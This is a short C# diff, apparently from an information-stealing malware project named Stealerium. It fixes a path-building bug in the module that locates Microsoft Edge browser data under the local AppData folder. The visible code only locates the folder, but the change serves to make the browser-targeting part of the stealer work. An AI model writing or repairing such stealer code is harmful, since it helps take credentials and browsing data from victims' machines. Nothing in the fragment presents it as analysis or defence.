@@ -8,7 +8,7 @@ namespace Stealerium.Target.Browsers.Edge
     {
         public static void Run(string sSavePath)
         {
-            var sFullPath = Paths.Lappdata + Paths.EdgePath;
+            var sFullPath = Paths.Lappdata + "\\" + Paths.EdgePath;
 
             if (!Directory.Exists(sFullPath))
                 return;
